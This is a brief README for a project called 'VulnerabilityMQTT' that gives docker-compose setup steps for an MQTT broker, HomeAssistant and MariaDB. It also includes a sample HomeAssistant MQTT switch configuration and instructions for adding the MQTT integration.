# VulnerabilityMQTT

## Setup
Up MQTT-broker, HomeAssistant and MariaDB
```shell
docker-compose build
docker-compose up -d 
```
For work with mqtt from HomeAssistant add this to `homeassistant/config/configuration.yaml`
```
mqtt:
broker: <broker_ip>

switch:
- platform: mqtt
  unique_id: 1
  name: "Ariston"
  command_topic: "light/1"
  qos: 1
  payload_on: "on"
  payload_off: "off"
  state_on: "ON"
  state_off: "OFF"
  retain: true
```

Then add MQTT to Integrations in HomeAssistant settings:

Settings -> Integrations -> ( + add Integration) -> MQTT
